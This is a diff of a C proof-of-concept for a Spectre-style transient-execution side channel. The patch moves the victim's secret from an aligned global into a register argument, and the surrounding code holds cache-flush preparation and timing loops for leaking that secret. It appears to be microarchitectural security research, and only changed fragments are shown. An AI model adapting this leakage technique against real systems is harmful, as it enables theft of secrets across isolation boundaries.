@@ -29,15 +29,15 @@ cache_ctx_t is_public_context __attribute__((aligned(2048)));
 cache_ctx_t arr_context __attribute__((aligned(2048)));
 
 
-int secret __attribute__((aligned(2048)))= 0xdeadbabe ;
+// int secret __attribute__((aligned(2048)))= 0xdeadbabe ;
 
 //32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25
 
 __attribute__((used))
-void victim_function(register int secret_val, int isPublic)
+void victim_function(register int secret, int isPublic)
 {
     if (isPublic < array[0x2 * STRIDE]) {
-        if(secret == 0) {
+        if(secret) {
           double tmp2;
           memcpy((void*)&tmp2, (void *)&val, sizeof(tmp2));
         }
@@ -61,12 +61,12 @@ void setup() {
     arr_context = cache_remove_prepare(&array[0x2 * STRIDE]);
     val_context = cache_remove_prepare(&val);
     val2_context = cache_remove_prepare(&val2);
-    secret_context = cache_remove_prepare(&secret);
+    // secret_context = cache_remove_prepare(&secret);
     return;
 }
 
 
-void leakValue() {
+void leakValue(register int secret) {
 
     int num_hits = 0 ;
 
@@ -127,7 +127,7 @@ int main(int argc, char *argv[])
     
     //printf("[Spectre Variant %d for Variable Time Instructions]\n", VARIANT);
     
-    secret = atoi(argv[1]);
+    register int secret = atoi(argv[1]);
     int guess = 0;
     
     uint64_t result[32];
@@ -142,7 +142,7 @@ int main(int argc, char *argv[])
     memory_fence();
     
     for(int i = 0; i < 32; i++){
-        leakValue();
+        leakValue(secret);
         result[i] = time1;
         result2[i] = time2;
     }
